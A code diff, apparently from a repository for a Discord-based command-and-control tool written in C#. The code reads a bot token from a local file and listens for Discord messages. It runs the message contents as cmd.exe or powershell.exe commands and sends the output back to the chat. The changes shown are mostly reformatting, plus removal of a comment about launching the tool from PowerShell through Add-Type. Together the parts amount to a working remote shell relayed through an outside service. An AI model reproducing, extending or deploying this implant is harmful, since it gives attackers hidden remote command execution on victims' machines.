@@ -21,8 +21,6 @@ namespace DiscordC2;
         } else goto shutdown;
     }
 
-    //Using add-type this entry point is callable from powershell
-    //[DiscordC2.Server]::Start()
     public static async Task Start() {
         discord = new DiscordClient(new DiscordConfiguration() {
                 Token =  File.ReadAllText(".dc2"),
@@ -35,8 +33,7 @@ namespace DiscordC2;
                 var (success, details, localException) = await Operations.STask(e.Message.Content.Replace("cmd", "/C"));
                 if (success) {
                     await e.Message.RespondAsync(details);
-                }
-                else if (localException is not null) {
+                } else if (localException is not null) {
                     await e.Message.RespondAsync(localException.Message);
                 }
             }
@@ -45,8 +42,7 @@ namespace DiscordC2;
                 var (success, details, localException) = await Operations.STask(e.Message.Content.Replace("pwsh", "-NoProfile "), "powershell");
                 if (success) {
                     await e.Message.RespondAsync(details);
-                }
-                else if (localException is not null) {
+                } else if (localException is not null) {
                     await e.Message.RespondAsync(localException.Message);
                 }
             }
@@ -58,10 +54,8 @@ namespace DiscordC2;
     }
 
     internal class Operations {
-        public static async Task<(bool succcess, string, Exception localException)> STask(string args, string taskType = "cmd")
-        {
-            try
-            {
+        public static async Task<(bool succcess, string, Exception localException)> STask(string args, string taskType = "cmd") {
+            try {
                 var start = new ProcessStartInfo
                 {
                     FileName = $"{taskType}.exe",
@@ -73,13 +67,10 @@ namespace DiscordC2;
                 using var reader = process!.StandardOutput;
                 process.EnableRaisingEvents = true;
 
-                string STaskResults = await reader.ReadToEndAsync();
+                string sTaskResults = await reader.ReadToEndAsync();
 
-                return (true, STaskResults, null)!;
-            }
-            catch (Exception localException)
-            {
-
+                return (true, sTaskResults, null)!;
+            } catch (Exception localException) {
                 return (false, "Failed", localException);
             }
         }
